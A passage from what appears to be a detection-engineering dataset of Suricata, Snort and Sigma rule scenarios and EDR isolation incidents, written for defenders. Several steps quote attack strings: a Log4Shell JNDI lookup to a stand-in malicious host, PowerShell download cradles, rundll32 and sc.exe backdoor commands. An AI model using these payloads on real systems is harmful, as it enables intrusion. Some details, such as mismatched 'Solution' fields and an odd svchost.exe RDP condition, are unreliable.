- **Solution**: DNS egress filtering + alert correlation
- **Tags**: dns, suricata, exfiltration, tunneling

## Suricata Rule for Cobalt Strike HTTP Beacon Detection

- **Attack Type**: Detection Engineering → Suricata Rule
- **Target**: Internal Network
- **Vulnerability**: HTTP beacon traffic with predictable profile
- **MITRE**: T1071.001
- **Impact**: Catches initial C2 contact post-exploit
- **Tools**: Suricata, RedELK, Cobalt Strike
- **Scenario**: Detects known patterns from Cobalt Strike beacon using default HTTP profile.
- **Attack Steps**: 1. Blue team reviews threat intel showing common Cobalt Strike HTTP profiles using POSTs to /submit.php and fixed headers. 2. During red team simulation, they observe consistent User-Agent strings (Mozilla/5.0), small content-length payloads (~90 bytes), and a regular 5-second beacon interval. 3. A Suricata rule is created to match on the specific HTTP path, User-Agent, and content size using a combination of http_uri, http_user_agent, and dsize. 4. The team tests it with a live beacon setup in a lab, confirming accurate detection. 5. False positives are reduced by adding destination domain exclusions for known enterprise apps. 6. Rule is placed into the production Suricata pipeline with integration into ELK for visibility. 7. The alert automatically kicks off a SOAR playbook that isolates the host and runs process correlation checks.
- **Detection**: Header and content-length detection
- **Solution**: Beacon profile variation + JA3 + domain sinkhole
- **Tags**: cobaltstrike, beacon, suricata, HTTP POST

## Snort Rule to Detect FTP Credentials in Cleartext

- **Attack Type**: Detection Engineering → Snort Rule
- **Target**: Legacy Systems
- **Vulnerability**: FTP transmits creds in cleartext
- **MITRE**: T1557.002
- **Impact**: Prevents credential sniffing over insecure channels
- **Tools**: Snort, Wireshark
- **Scenario**: Identifies FTP sessions where login credentials are sent unencrypted.
- **Attack Steps**: 1. While reviewing legacy servers, the SOC detects FTP port 21 open on a few Windows 2003 systems. 2. Packet captures reveal plain USER and PASS commands with cleartext credentials. 3. A Snort rule is created to match payloads beginning with USER and PASS followed by alphanumeric strings. 4. SOC simulates login using FileZilla to test the alerting capability. 5. The rule correctly triggers with each login attempt, showing the full credentials in the alert metadata. 6. Legacy devices are marked for migration, and the rule is retained to catch future exposures. 7. Additional alerting includes correlation with passive asset inventory to prioritize insecure systems.
- **Detection**: Keyword match on FTP protocol fields
- **Solution**: Migrate to FTPS/SFTP and enforce SSL use
- **Tags**: ftp, snort, credentials, cleartext

## Suricata Rule for ZIP File Exfiltration via HTTP

- **Attack Type**: Detection Engineering → Suricata Rule
- **Target**: Internal Hosts
- **Vulnerability**: ZIP file exfil for bulk data theft
- **MITRE**: T1041
- **Impact**: Prevents archive-based data theft
- **Tools**: Suricata, Bro, ELK
- **Scenario**: Detects large ZIP files being exfiltrated over HTTP responses.
- **Attack Steps**: 1. Blue team identifies abnormal outbound HTTP responses where ZIP files are being downloaded to external IPs during non-working hours. 2. Analysts capture the traffic and find Content-Disposition headers delivering .zip attachments from internal IPs. 3. A Suricata rule is created using http_header and file_data to detect filename=\"*.zip\" patterns and filter responses over 500KB. 4. Simulated tests using internal scripts to serve .zip files confirm that the alert fires precisely. 5. Analysts also validate against internal software update ZIPs to avoid false positives. 6. Upon deployment, the rule is integrated with Kibana dashboards and configured to trigger incident escalation if triggered more than twice from a single source in an hour. 7. EDR response playbooks are set to check the origin process that accessed the files.
- **Detection**: Header inspection + file pattern matching
- **Solution**: Restrict outbound .zip sharing + DLP policies
- **Tags**: zip exfiltration, HTTP, suricata

## Snort Rule for Nmap OS Fingerprinting Detection

- **Attack Type**: Detection Engineering → Snort Rule
- **Target**: Internal Subnet
- **Vulnerability**: Reconnaissance via active fingerprinting
- **MITRE**: T1046
- **Impact**: Early alert on attacker reconnaissance
- **Tools**: Snort, Wireshark
- **Scenario**: Detects specific packet patterns used in Nmap OS detection (-O).
- **Attack Steps**: 1. SOC receives alerts of stealthy internal network scans. Analysts analyze pcap files and notice TCP SYN packets with specific combinations: low TTL, window size 1024, and DF (Don't Fragment) set. 2. These packet signatures match Nmap's OS fingerprinting module (nmap -O). 3. A Snort rule is built to detect such SYN packets with options MSS, Timestamp, and rare flags. 4. Analysts simulate scans from multiple machines using both Nmap and masscan to test detection. 5. Rule triggers when the fingerprint matches, with alerts showing source IP, TTL, window size, and TCP flags. 6. Rule is deployed to all sensor zones, and alerts are enriched with hostnames and assigned severity in SIEM. 7. SOC adds adaptive blocking rules for repeated offenders.
- **Detection**: TCP flag + TTL + window pattern match
- **Solution**: Auto-block scans + segment access
- **Tags**: nmap, OS detection, snort

## Suricata Rule to Detect EternalBlue Exploit (MS17-010)

- **Attack Type**: Detection Engineering → Suricata Rule
- **Target**: Windows Servers
- **Vulnerability**: SMBv1 exploit vulnerability
- **MITRE**: T1210
- **Impact**: Detects wormable lateral exploit
- **Tools**: Suricata, Wireshark, Metasploit
- **Scenario**: Detects SMB exploit packets attempting MS17-010 (EternalBlue).
- **Attack Steps**: 1. Analysts simulate EternalBlue attacks using Metasploit (exploit/windows/smb/ms17_010_eternalblue). 2. Packet analysis shows specific malformed SMB packets with signature bytes like 0x00 0x00 0x00 0x90 and NT Transaction patterns. 3. A Suricata rule is written to detect these byte sequences in SMBv1 traffic over port 445. 4. Engineers test across patched and unpatched VMs. The rule fires only on exploitation attempts, not on standard SMB traffic. 5. Rule is deployed to monitor lateral movement and worm-like behavior. 6. Alerts are tied with asset risk scores; vulnerable hosts are prioritized for patching. 7. Security team adds an automated playbook to isolate systems triggering this rule.
- **Detection**: Byte pattern match on SMB headers
- **Solution**: Patch MS17-010 + disable SMBv1
- **Tags**: smb, eternalblue, suricata, exploit

## Suricata Rule for Detecting Cobalt Strike Beacon over HTTPS

- **Attack Type**: Detection Engineering → Suricata Rule
- **Target**: Internal Clients
- **Vulnerability**: HTTPs C2 channel with unique SSL behavior
- **MITRE**: T1071.001
- **Impact**: Detects stealthy beacon communication
- **Tools**: Suricata, JA3, RedELK
- **Scenario**: Signature detection of HTTPS beacon patterns used by Cobalt Strike.
- **Attack Steps**: 1. During threat emulation, beacon traffic is captured with predictable headers and SSL fingerprints (JA3 hash). 2. The beacons initiate POSTs to URIs like /submit.php with static content sizes and TLS negotiation using a known Cobalt Strike JA3 signature. 3. Suricata rule is written to inspect JA3 fingerprint + destination URI + header pattern. 4. Team simulates beacons with varying intervals and confirms detection across beacon profile changes. 5. Alerts provide context such as destination IP, user agent, and JA3 hash. 6. Alerts are tied into RedELK dashboards and used to map infected hosts.
- **Detection**: SSL JA3 + header + URI + timing pattern
- **Solution**: Beacon profile tuning + block JA3 hash
- **Tags**: cobaltstrike, HTTPS, suricata, JA3

## Snort Rule for Outbound Tor Connections

- **Attack Type**: Detection Engineering → Snort Rule
- **Target**: Enterprise Network
- **Vulnerability**: Anonymized outbound C2
- **MITRE**: T1090.003
- **Impact**: Prevents covert C2 via anonymity networks
- **Tools**: Snort, Tor Exit List
- **Scenario**: Detects attempts to access Tor relays over ports 9001/443.
- **Attack Steps**: 1. Analyst configures daily downloads of known Tor exit node IPs via AbuseIPDB. 2. A Snort rule is written to alert on any outbound connections from internal IPs to the Tor exit list over TCP ports 443 or 9001. 3. Team simulates access using the Tor browser from a sandbox. 4. Alerts are triggered and include full session details like SNI, destination IP, and ports. 5. Alerts are marked critical if multiple Tor connections are observed from the same host. 6. Block rules are automatically pushed to firewalls if activity is sustained.
- **Detection**: IP + port + SNI match with threat feed
- **Solution**: Egress filtering + DNS sinkholing
- **Tags**: tor, snort, outbound detection

## Suricata Rule for Java Deserialization Exploit Detection

- **Attack Type**: Detection Engineering → Suricata Rule
- **Target**: Java Web Apps
- **Vulnerability**: Insecure deserialization
- **MITRE**: T1210
- **Impact**: Catches exploit attempt on legacy endpoints
- **Tools**: Suricata, ysoserial, Wireshark
- **Scenario**: Detects serialized Java object payloads in HTTP requests.
- **Attack Steps**: 1. SOC learns about a critical deserialization bug (CVE-2017-9805) in Java-based web apps. 2. Exploit payloads include AC ED 00 05 — Java object stream magic bytes. 3. Suricata rule is created to inspect HTTP POST bodies for these byte patterns. 4. Analyst uses ysoserial to craft payloads and send them to vulnerable endpoints like /api/xml. 5. Alerts are successfully triggered and show source, content length, and URI. 6. Rule deployed across DMZ and internal dev environments. 7. DevOps team informed to sanitize serialization logic.
- **Detection**: Byte stream match in POST body
- **Solution**: Patch + Java object sanitization
- **Tags**: java, deserialization, suricata

## Snort Rule for FTP Cleartext Login Detection

- **Attack Type**: Detection Engineering → Snort Rule
- **Target**: Legacy Servers
- **Vulnerability**: Cleartext credential exposure
- **MITRE**: T1557.002
- **Impact**: Prevents credential interception
- **Tools**: Snort, Wireshark
- **Scenario**: Detects FTP logins transmitting USER/PASS in clear text.
- **Attack Steps**: 1. Network audit reveals FTP services still active on legacy devices. 2. Analysts observe plain text credentials in TCP streams during logins. 3. Snort rule is written using content and pcre to flag USER and PASS keywords. 4. Team confirms via ftp CLI that alerts fire and show the credentials in logs. 5. Alert data includes IP, timestamp, and attempted credentials. 6. SOC correlates this data with host inventory and flags the system for retirement.
- **Detection**: Pattern match on protocol keywords
- **Solution**: Migrate to SFTP/FTPS only
- **Tags**: ftp, snort, legacy risk

## Suricata Rule to Detect Phishing via PDF Delivery

- **Attack Type**: Detection Engineering → Suricata Rule
- **Target**: Email/Web Gateway
- **Vulnerability**: File delivery with embedded exploit
- **MITRE**: T1566.002
- **Impact**: Blocks phishing via PDF dropper
- **Tools**: Suricata, Bro, AV Sandbox
- **Scenario**: Identifies PDF attachments with embedded JS/links in HTTP responses.
- **Attack Steps**: 1. Team receives phishing report of fake invoices delivered via PDF. 2. Malicious PDFs have MIME headers like application/pdf and high entropy in payloads (embedded JS). 3. Suricata rule written to match PDF MIME type + entropy threshold + HTTP response headers. 4. SOC simulates phishing attack using evilpdf.py, alert fires correctly. 5. Alerts tagged and routed to AV sandbox for detonation. 6. Mail and proxy rules updated to block such payloads.
- **Detection**: Header + entropy-based payload match
- **Solution**: Sandbox validation + content filtering
- **Tags**: pdf, phishing, suricata

## Snort Rule for Fake Login Portals (Credential Harvesting)

- **Attack Type**: Detection Engineering → Snort Rule
- **Target**: Web Proxy
- **Vulnerability**: Credential theft via phishing portals
- **MITRE**: T1566.001
- **Impact**: Catches exfil attempts on login forms
- **Tools**: Snort, URLhaus
- **Scenario**: Detects HTTP POST to known phishing domains with login fields.
- **Attack Steps**: 1. Analysts use URLhaus feed to collect active phishing sites. 2. Snort rule matches POST requests to domains like login-verify[.]com, looking for username= or password= in payload. 3. SOC simulates phishing site interaction via controlled browser. 4. Alerts fire and show fields like source IP, destination domain, and form content. 5. Rule deployed across mail and web proxy tap interfaces.
- **Detection**: POST field match + threat domain
- **Solution**: Block phishing URLs + educate users
- **Tags**: phishing, login, snort, POST

## Suricata Rule for Meterpreter Reverse HTTPS Beacon

- **Attack Type**: Detection Engineering → Suricata Rule
- **Target**: Compromised Host
- **Vulnerability**: HTTPS tunnel to attacker
- **MITRE**: T1071.001
- **Impact**: Catches persistent access beacon
- **Tools**: Suricata, Metasploit
- **Scenario**: Detects reverse HTTPS payload communication from Meterpreter.
- **Attack Steps**: 1. In lab, red team launches Meterpreter payload over HTTPS. 2. Analysts observe beacon POSTs to /connect with 93-byte payloads. 3. Suricata rule written to inspect URI + content length + JA3 fingerprint of SSL session. 4. Alert triggers and shows full beacon metadata: IP, headers, URI. 5. Rule tied to SIEM with high priority and triggers memory dump task.
- **Detection**: JA3 + URI + timing + payload size
- **Solution**: Block beacon paths + isolate system
- **Tags**: meterpreter, suricata, https, C2

## Sigma Rule for Suspicious Parent-Child Process (CMD spawning PowerShell)

- **Attack Type**: Detection Engineering → Sigma Rule Creation
- **Target**: Windows Hosts
- **Vulnerability**: Living-off-the-land scripting chains
- **MITRE**: T1059.001
- **Impact**: Detects initial script-based persistence
- **Tools**: Sigma, Sigmac, Sysmon, Splunk
- **Scenario**: Detects when cmd.exe launches powershell.exe, often indicating post-exploitation scripting.
- **Attack Steps**: 1. An attacker gains access via a phishing payload and spawns a reverse shell. 2. From the shell, cmd.exe is used as a launcher to invoke powershell.exe -enc with obfuscated commands. 3. Sysmon logs this parent-child process relationship with event ID 1 (Process Creation). 4. Blue team writes a Sigma rule detecting when cmd.exe is the parent and powershell.exe is the child process. 5. They test the rule using simulated reverse shell scripts in a sandbox and observe that it accurately flags abuse. 6. The rule is converted via sigmac into Splunk SPL and deployed in their SIEM for real-time alerting. 7. Detected events now auto-trigger a response that includes process tree extraction and memory scan via SOAR.
- **Detection**: Parent-child correlation on Sysmon logs
- **Solution**: Disable PowerShell enc, restrict script execution
- **Tags**: sigma, powershell, cmd, splunk

## Sigma Rule for Suspicious Registry Persistence

- **Attack Type**: Detection Engineering → Sigma Rule Creation
- **Target**: Workstations
- **Vulnerability**: Registry-based startup persistence
- **MITRE**: T1547.001
- **Impact**: Detects stealthy auto-start entries
- **Tools**: Sigma, Kape, Winlogbeat
- **Scenario**: Detects creation of Run key entries in HKCU/HKLM for persistence.
- **Attack Steps**: 1. An attacker installs persistence using a registry key under HKCU\Software\Microsoft\Windows\CurrentVersion\Run. 2. The executable is dropped in %AppData%, and the key value is updated to execute on user logon. 3. Windows Event Logs (ID 13 or Sysmon Event ID 13) show registry value modifications. 4. Analysts write a Sigma rule that looks for key paths like *\\Run and executable paths in suspicious directories. 5. The rule is tested using simulated key creation via reg.exe and RegEdit. 6. False positives (e.g., antivirus updaters) are filtered out with allowlists. 7. The rule is converted for use in Sentinel and Qradar and added to dashboards for lateral movement detection.
- **Detection**: Registry key change monitoring
- **Solution**: Autoruns review + disable write perms
- **Tags**: sigma, registry, startup

## Sigma Rule for Unusual Service Installation

- **Attack Type**: Detection Engineering → Sigma Rule Creation
- **Target**: Windows Systems
- **Vulnerability**: Abuse of service registration for persistence
- **MITRE**: T1543.003
- **Impact**: Identifies non-standard service paths
- **Tools**: Sigma, Sysmon, Elastic SIEM
- **Scenario**: Detects creation of new Windows services pointing to unusual locations.
- **Attack Steps**: 1. Red team uses sc.exe create to register a backdoor service (backconnect) pointing to C:\\Users\\Public\\rat.exe. 2. Sysmon logs Event ID 6 and Event ID 7045 in Windows logs capture service creation. 3. Blue team writes a Sigma rule that looks for service binary paths in C:\\Users\\*, C:\\Temp, or any uncommon directories. 4. They simulate both legitimate and malicious service creation for tuning. 5. The rule is deployed to Elastic SIEM with logic that filters out known signed paths (like antivirus). 6. When triggered, the alert runs a SOAR script to query service configuration and verify digital signature.
- **Detection**: File path pattern in service configs
- **Solution**: Service hardening + signature validation
- **Tags**: sigma, services, Sysmon

## Sigma Rule for Brute-Force RDP Failures

- **Attack Type**: Detection Engineering → Sigma Rule Creation
- **Target**: Remote Servers
- **Vulnerability**: Password spraying or brute-force login
- **MITRE**: T1110
- **Impact**: Prevents credential brute-forcing
- **Tools**: Sigma, Winlogbeat, Sentinel
- **Scenario**: Detects large numbers of failed RDP login attempts in short time frame.
- **Attack Steps**: 1. Attacker launches a brute-force tool (e.g., Hydra) targeting RDP on multiple servers. 2. Windows Security logs Event ID 4625 show repeated login failures with varying usernames. 3. Analysts write a Sigma rule looking for more than 10 4625 events from the same source IP within 5 minutes targeting svchost.exe. 4. The rule is converted to KQL (for Sentinel) and SPL (for Splunk) and validated in a sandbox by simulating brute attempts. 5. Alert thresholds are adjusted to avoid triggering on regular admin password changes. 6. The rule is deployed with auto-containment actions if over 20 failures are seen, including IP block via firewall.
- **Detection**: Event correlation on failed logins
- **Solution**: RDP rate limiting + MFA
- **Tags**: sigma, RDP, brute-force

## Sigma Rule for Rundll32 DLL Sideloading

- **Attack Type**: Detection Engineering → Sigma Rule Creation
- **Target**: Endpoints
- **Vulnerability**: Living-off-the-land DLL abuse
- **MITRE**: T1218.011
- **Impact**: Stops stealth execution of unsigned DLLs
- **Tools**: Sigma, Sysmon, Event Viewer
- **Scenario**: Detects misuse of rundll32.exe to execute malicious DLLs from user-writable paths.
- **Attack Steps**: 1. Adversary places a crafted DLL in C:\\Users\\Public\\malicious.dll. 2. They execute it using rundll32.exe malicious.dll,ExportedFunc. 3. Sysmon logs process creation (Event ID 1) showing rundll32.exe with unusual DLL path. 4. Sigma rule checks for rundll32.exe in combination with any DLL path containing C:\\Users\\, AppData, or Temp. 5. The rule is tested with simulated payloads and refined to eliminate common false positives from software updaters. 6. Deployed to SIEM with alert enrichment showing parent process and DLL hash. 7. When triggered, the response flow includes DLL quarantine, host triage, and user lockout.
- **Detection**: rundll32 with abnormal path indicators
- **Solution**: Block rundll32 on user paths + allowlist DLLs
- **Tags**: sigma, DLL sideloading, rundll32

## Suricata Rule for CVE-2021-44228 (Log4Shell) in HTTP Headers

- **Attack Type**: Detection Engineering → Suricata Rule
- **Target**: Web Servers
- **Vulnerability**: Remote Code Execution via logging
- **MITRE**: T1210
- **Impact**: Detects active Log4j exploit attempts
- **Tools**: Suricata, ELK, Regex
- **Scenario**: Detects JNDI-based exploit strings targeting Java apps via Log4j injection.
- **Attack Steps**: 1. A red team sends HTTP headers containing ${jndi:ldap://malicious.com/a} to vulnerable Log4j apps. 2. Payloads are embedded in User-Agent, X-Forwarded-For, and custom headers. 3. Suricata rule uses content and pcre to detect ${jndi: patterns across all headers. 4. Analysts simulate exploits using curl and Burp Suite to confirm detection. 5. The rule includes depth/offset logic to reduce false positives. 6. Alert metadata includes source IP, full header payload, and target URI. 7. On detection, SOAR automatically blocks the source and initiates WAF updates.
- **Detection**: Pattern match in header fields
- **Solution**: Patch Log4j, block patterns at WAF
- **Tags**: log4shell, log4j, suricata

## Snort Rule for Exe File Transfer via HTTP GET

- **Attack Type**: Detection Engineering → Snort Rule
- **Target**: Endpoints
- **Vulnerability**: User-initiated payload delivery
- **MITRE**: T1204.002
- **Impact**: Detects drive-by or dropper delivery
- **Tools**: Snort, Security Onion
- **Scenario**: Flags .exe downloads over HTTP from non-whitelisted domains.
- **Attack Steps**: 1. SOC observes multiple alerts from unknown domains delivering .exe files via HTTP GET. 2. Threat actors host malicious payloads named update.exe, patch.exe, etc. 3. Snort rule uses http_uri + file_data to detect *.exe file delivery via GET. 4. Analysts simulate downloads with wget and browsers from both trusted and untrusted domains. 5. Rule is refined using domain whitelists and only fires if URI contains .exe and Referer/Host is not trusted. 6. Alerts provide full URI, source IP, domain, and user agent. 7. Block rules are added for repeat offender IPs.
- **Detection**: URI and MIME type pattern
- **Solution**: Content filtering + domain allowlist
- **Tags**: exe, snort, drive-by

## Suricata Rule for Outbound File Exfil via ZIP on Port 443

- **Attack Type**: Detection Engineering → Suricata Rule
- **Target**: Internal Hosts
- **Vulnerability**: Encrypted archive exfiltration
- **MITRE**: T1041
- **Impact**: Flags covert archive uploads
- **Tools**: Suricata, JA3, Wireshark
- **Scenario**: Detects encrypted archive exfiltration disguised as HTTPS traffic.
- **Attack Steps**: 1. Analysts detect large encrypted ZIP files being exfiltrated via outbound HTTPS POST to unmonitored domains. 2. Suricata rule matches MIME types for .zip and file size >1MB, combined with known JA3 fingerprints of non-browser clients. 3. Testing involves sending ZIP files via Python HTTPS clients and simulating benign traffic from browsers. 4. Alert triggers if encrypted ZIPs are uploaded to untrusted domains using unusual JA3. 5. SOC uses TLS fingerprinting and TLS SNI to enrich alerts. 6. On trigger, an IR playbook is activated to inspect host temp directories.
- **Detection**: MIME match + JA3 fingerprint + size
- **Solution**: Limit outbound HTTPS to known clients
- **Tags**: zip, HTTPS, JA3, suricata

## Snort Rule for NTLMv2 Hash Capture via SMB

- **Attack Type**: Detection Engineering → Snort Rule
- **Target**: Internal Workstations
- **Vulnerability**: Credential theft via hash interception
- **MITRE**: T1557.001
- **Impact**: Detects NTLM relay/hash exfil attempts
- **Tools**: Snort, Wireshark, Responder
- **Scenario**: Detects outbound SMB requests attempting to negotiate NTLMv2, often used in hash theft.
- **Attack Steps**: 1. A red team uses Responder to trick a user into connecting to a rogue SMB server. 2. The victim's machine attempts NTLMv2 authentication and sends a hash to the attacker. 3. Snort rule watches for NTLMSSP_AUTH patterns in outbound SMB over TCP 445. 4. Analysts simulate MITM scenario and capture test NTLMv2 hash transmission. 5. Rule filters based on SMB version and alerts on outbound NTLM auth to external IPs. 6. Alerts are tied with proxy logs to identify malicious redirects. 7. Egress controls are implemented for SMB.
- **Detection**: Signature match on auth exchange
- **Solution**: Block SMB egress + disable NTLMv1/v2 externally
- **Tags**: smb, snort, responder

## Suricata Rule for PowerShell Over HTTP Beaconing

- **Attack Type**: Detection Engineering → Suricata Rule
- **Target**: Endpoints
- **Vulnerability**: Obfuscated script-based beaconing
- **MITRE**: T1059.001
- **Impact**: Flags command delivery channel
- **Tools**: Suricata, C2 Profiles, Wireshark
- **Scenario**: Identifies encoded PowerShell payloads over HTTP POSTs, typically from C2 frameworks.
- **Attack Steps**: 1. Adversary uses Invoke-WebRequest or IEX(New-Object Net.WebClient) to POST data to C2 server. 2. The payload is base64-encoded PowerShell script, sent via HTTP POST in small chunks. 3. Suricata rule is created to match User-Agent: WindowsPowerShell/* with POST method and base64 content. 4. Analysts replay payloads using Nishang and Empire to test rule detection. 5. Alert includes HTTP headers, content length, and URI. 6. Rule is deployed with conditional rate-based correlation to identify beacon intervals.
- **Detection**: Header match + POST content pattern
- **Solution**: Block suspicious UAs + disable PowerShell in proxy
- **Tags**: powershell, http, suricata

## SOC-Driven Isolation via CrowdStrike Falcon After C2 Beacon

- **Attack Type**: Manual EDR Isolation
- **Target**: Windows Laptop
- **Vulnerability**: C2 behavior → manual EDR isolation
- **MITRE**: T1071.001, T1560
- **Impact**: Analyst-initiated containment after beacon
- **Tools**: CrowdStrike Falcon, Wireshark, ProcMon, Sysinternals Suite
- **Scenario**: Beaconing laptop manually isolated after C2 communication detected
- **Attack Steps**: CrowdStrike console detects persistent C2 communication every 60s from a marketing laptop to officeupdates[.]live. Wireshark confirms non-standard port 8443 with HTTP payloads mimicking Chrome traffic. SOC uses Falcon console to isolate host, which disables all NICs and suspends non-system processes. Pre-isolation memory is dumped, revealing injected shellcode in explorer.exe. RegShot identifies persistence via HKCU\Software\Microsoft\Office\Addins\UpdateMacro. ProcMon tracks the dropper script which was embedded in a seemingly benign .docm. The team blocks domain in proxy, recovers malicious document, builds new detection signature, and reimages isolated host.
- **Detection**: DNS + EDR + memory scan → isolate
- **Solution**: Custom macro + C2 + network behavior
- **Tags**: #c2beacon #edrmanual #containment

## NAC Integration Automatically Disconnects Rogue Laptop

- **Attack Type**: NAC + EDR Trigger
- **Target**: Windows Laptop
- **Vulnerability**: BYOD rogue host detected by NAC
- **MITRE**: T1049, T1016
- **Impact**: Network-level isolation through NAC → EDR link
- **Tools**: Aruba ClearPass, Defender ATP, Sysmon, Nmap
- **Scenario**: Unmanaged laptop connected to internal switch triggers isolation
- **Attack Steps**: A BYOD laptop is plugged into a production floor switch. NAC system sees no enrollment record and triggers VLAN quarantine. DHCP logs confirm rogue asset MAC not in allowlist. Simultaneously, Defender ATP on peer systems detects ARP storm and DNS poisoning attempts originating from the MAC. NAC sends EDR webhook to Defender ATP, which immediately isolates device. SOC uses Nmap to validate asset is unreachable, triggers port shutdown, and collects switch port capture via SPAN. Lateral impact contained as NAC auto-remediates VLAN segmentation and alerts IT to rogue hardware asset. Incident declared for physical asset tampering.
- **Detection**: Switch connect → ARP storm → VLAN eject → EDR quarantine
- **Solution**: NAC + EDR + DHCP + port logs
- **Tags**: #roguehost #nac #vlanisolation

## Remote Workstation Isolated After Suspicious Scripting via VPN

- **Attack Type**: VPN Behavioral Anomaly
- **Target**: Windows Workstation (Remote)
- **Vulnerability**: VPN behavior + script anomaly → isolate
- **MITRE**: T1059.001, T1040
- **Impact**: PowerShell beacon + VPN data flow
- **Tools**: VPN Monitor, Defender for Endpoint, PowerShell Logs, Zeek
- **Scenario**: Remote employee triggers alerts due to rapid scripting & VPN spike
- **Attack Steps**: A remote employee working via VPN suddenly generates 800+ PowerShell execution logs in 10 minutes. Defender for Endpoint flags execution of base64 scripts downloading .exe files from Google Drive. VPN monitoring tool shows a data upload spike to cdn.safefile[.]org. SOC sends Defender EDR command to isolate host — NIC is shut off, and no longer reachable via VPN. Pre-isolation forensic script collects PowerShell history, user token details, and event logs. Analysis confirms use of Invoke-WebRequest in encoded form, likely launched via Task Scheduler. Host was compromised through credential theft. SOC rotates VPN tokens, disables account, and begins credential exposure analysis.
- **Detection**: EDR alert → VPN flow → isolate → forensics
- **Solution**: VPN logs + PS logs + token forensics
- **Tags**: #vpnabuse #powershell #remoteisolation

## Host Isolated via USB Event Alert & Malware Write Detection

- **Attack Type**: USB Malware Delivery
- **Target**: Windows Desktop
- **Vulnerability**: USB drop → script + binary → isolate
- **MITRE**: T1091, T1204.002
- **Impact**: USB + autorun persistence → live isolation
- **Tools**: USBDeview, EDR Agent, PEStudio, Event Viewer
- **Scenario**: Endpoint plugged with unauthorized USB → drops malware → isolation
- **Attack Steps**: A front-desk machine logs USB insert event with VID/PID matching known rogue USB. EDR flags setup.exe written to disk within 3 seconds. PEStudio confirms high-entropy executable with no imports and fake signature block. SOC agent isolates endpoint via one-click EDR command: NIC disabled, logging turned to persistent. Memory captured with injected shellcode visible in svchost.exe. Autoruns tool confirms USB autorun script modified registry RunOnce keys. File connects to updates.flashcdn[.]pw. Post-isolation, system is reimaged and USB ports disabled via GPO. SOC modifies USB device control policy and implements endpoint USB scan for future insert events.
- **Detection**: USB insert → EDR alert → registry edit → network callback
- **Solution**: Event ID + autorun + memory shellcode
- **Tags**: #usbattack #autorun #containment

## Windows Domain Controller Isolated After Signs of Golden Ticket Attack

- **Attack Type**: Kerberos Ticket Forgery
- **Target**: Windows Server (DC)
- **Vulnerability**: Forged ticket → isolate DC node
- **MITRE**: T1558.001
- **Impact**: Golden ticket creation → AD abuse
- **Tools**: Mimikatz, DC Logs, Zeek, Splunk, EDR Agent
- **Scenario**: EDR + SIEM alert for anomalous Kerberos activity → domain isolation
- **Attack Steps**: SIEM correlation rule flags DC issuing a TGT with 10-year expiry. EDR shows sudden LSASS memory access by unknown process. Mimikatz memory dump confirms forged golden ticket used to access internal share. SOC uses privileged EDR tenant to isolate the domain controller — disables LAN access, and sysinternals tools used to validate process integrity. AD logs reveal event 4768 anomalies and null user SID. Isolation helps avoid lateral compromise to peer DCs. Zeek logs show unusual SMB share browsing post-TGT issuance. SOC pushes patch for DC hardening, resets KRBTGT account, and isolates AD snapshots for rollback.
- **Detection**: EDR memory access → ticket forge → SMB trace
- **Solution**: KDC logs + EDR LSASS + lateral trace
- **Tags**: #goldenticket #dcisolation #kerberosabuse

## Host Quarantined Automatically After Multiple AV Tampering Attempts

- **Attack Type**: AV/EDR Tampering
- **Target**: Windows
- **Vulnerability**: Defender tamper → isolation by rule
- **MITRE**: T1562.001
- **Impact**: Registry edits + process kill + injection attempt
- **Tools**: Defender ATP, Registry Auditing, PowerShell Logs, Sysinternals
- **Scenario**: Malware disables Windows Defender + bypasses tamper protection
- **Attack Steps**: Endpoint starts logging Defender tampering events — multiple registry edits attempt to disable Defender and Real-time Protection. EDR detects attempt to kill MsMpEng.exe and suspends the process. Isolation command auto-executed based on tampering severity level. PowerShell log shows attacker tried bypassing Tamper Protection with Add-MpPreference. Volatile memory captured before NIC block confirms attempt to inject binary into csrss.exe. SOC initiates reverse analysis of injected file and hardens tamper detection triggers by introducing regex pattern-matching for internal registry path misuse. Host is reimaged.
- **Detection**: EDR tamper alert → PS decode → auto-contain
- **Solution**: Defender logs + registry + mem inject
- **Tags**: #tamperbypass #avdisable #autoquarantine

## Suspicious Binary Downloaded via FTP from Printer Subnet Triggers Isolation

- **Attack Type**: Lateral Move via Embedded Device
- **Target**: Windows Workstation
- **Vulnerability**: Unmonitored subnet → lateral file drop
- **MITRE**: T1071.002
- **Impact**: FTP → binary → winlogon inject → isolate
- **Tools**: EDR Agent, Wireshark, Printer Logs, Zeek
- **Scenario**: Unsecured network printer subnet used to upload binary
- **Attack Steps**: A system in finance downloads config64.exe from IP 192.168.50.200 over FTP. SOC finds IP belongs to a misconfigured printer. Binary is dropped in C:\Windows\Temp\ and immediately executed. EDR shows it attempts process injection into winlogon.exe. Wireshark confirms no authentication on FTP session. SOC isolates endpoint using EDR, disables all outbound from the printer VLAN. Printer's firmware is scanned — reveals an open FTP dropbox feature with no ACL. SOC patches firmware, closes VLAN ACLs, and creates Zeek alert for FTP transfers from non-whitelisted subnets.
- **Detection**: EDR alert → subnet trace → FTP abuse
- **Solution**: Net capture + VLAN + process trace
- **Tags**: #printerattack #ftp #edrisolation

## Suspicious Remote Desktop Session Results in Manual Host Lockdown

- **Attack Type**: Abused RDP Session
- **Target**: Windows Workstation
- **Vulnerability**: RDP → user creation + tools drop
- **MITRE**: T1076, T1078
- **Impact**: RDP abuse + local user + lateral tool drop
- **Tools**: RDP Logs, Splunk, Sysinternals, PEStudio, Netstat
- **Scenario**: RDP from unrecognized IP creates user and installs toolset
- **Attack Steps**: Overnight RDP connection from public IP seen in Splunk dashboard. Connection established to workstation with weak password. User supportsvc created and added to Admins group. Tools like procdump.exe, netcat.exe, and mimikatz.exe appear in Downloads folder. SOC issues manual EDR isolation; remote session killed, and host placed in containment VLAN. Memory forensics confirms credential dump, Netstat logs reveal lateral intent. SOC blocks offending IP, rotates credentials enterprise-wide, and tightens RDP firewall policies with whitelist IPs.
- **Detection**: RDP trace → local user → isolate → dump scan
- **Solution**: Netstat + memdump + user audit
- **Tags**: #rdpabuse #remotesession #isolation

## Cloud VM Isolated After Botnet Activity Detected via Flow Analytics

- **Attack Type**: Cloud EDR Containment
- **Target**: Linux Cloud VM
- **Vulnerability**: Cloud EDR → botnet traffic → isolate
- **MITRE**: T1043, T1567
- **Impact**: VM outbound → flow alert → quarantine
- **Tools**: Azure Security Center, Flow Logs, Suricata, Cloud EDR
- **Scenario**: Azure VM triggers alerts for outbound to known botnet IPs
